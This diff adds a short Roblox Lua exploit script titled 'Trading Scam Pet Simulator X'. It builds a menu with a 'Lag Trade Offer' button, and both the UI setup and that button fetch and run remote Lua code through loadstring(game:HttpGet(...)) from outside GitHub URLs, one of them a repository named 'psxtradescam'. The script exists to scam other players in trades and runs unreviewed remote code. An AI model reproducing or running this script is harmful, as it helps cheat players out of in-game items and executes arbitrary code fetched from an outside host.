@@ -1,0 +1,10 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Trading Scam Pet Simulator X", "Ocean")
+    -- MAIN
+    local Main = Window:NewTab("Main")
+    local MainSection = Main:NewSection("Main")
+
+
+    MainSection:NewButton("Lag Trade Offer", "Lags The Trade Offer.", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psxautofarm1/Psxtradescam/main/psxtradescam.lua",true))()
+    end)
